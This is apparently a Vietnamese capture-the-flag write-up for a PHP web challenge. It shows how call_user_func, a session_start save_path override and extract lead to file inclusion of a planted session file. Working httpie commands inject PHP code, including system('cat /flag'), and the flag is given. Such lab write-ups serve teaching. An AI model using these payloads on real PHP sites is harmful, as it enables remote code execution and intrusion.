# PHP Izar Best

Level: Medium

```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    ini_set('open_basedir', '/var/www/html:/tmp');
    $file = 'function.php';
    $func = isset($_GET['function'])?$_GET['function']:'filters'; 
    call_user_func($func,$_GET);
    include($file);
    session_start();
    $_SESSION['name'] = $_POST['name'];
    if($_SESSION['name']=='admin'){
        header('location:admin.php');
    }
?>
```

chall này cung cấp cho chúng ta source code của file index.php. ta có thể thấy rằng hàm call_user_func($func,$_GET); không được xác thực trước bởi một bộ lọc an toàn sau đó: include($file); . Điều này cho thấy ta có thể sử dụng extract để che các biến và tấn công File Inclusion.

đối với kỹ thuật này, hàm session_start() ta thấy giá trị phiên có thể được kiểm soát và phiên được lưu ở những vị trí sau theo mặc định:
``` php
/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID

/var/lib/php5/sess_PHPSESSID
/var/lib/php5/sessions/sess_PHPSESSID

/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
```

hàm session_start() có một tham số mảng options, nếu được cung cấp nó sẽ ghi đè lên mục cấu hình phiên và nó chứa save_path , điều này có thể được sử dụng để đổi vị trí lưu phiên.

Vì vậy, ý tưởng là chuyển vào một hàm session_start để sửa đổi vị trí lưu trữ.

```shell
http --form post "http://127.0.0.1:8003/?function=session_start&save_path=."  name='<?php phpinfo(); ?>' Cookie:PHPSESSID=ivs6beep0k40niqru85ia36bb3
```

sau đó chúng ta truy cập: http://127.0.0.1:8003/?function=extract&file=ivs6beep0k40niqru85ia36bb3

sẽ nhận được trang phpinfo()

Từ đây, bạn có thể chèn shell để khai thác.
```shell
http --form post "http://127.0.0.1:8003/?function=session_start&save_path=."  name='<?php system("cat /flag"); ?>' Cookie:PHPSESSID=ivs6beep0k40niqru85ia36bb3
```

>> flag: flag{sens1t1ve_sess10n}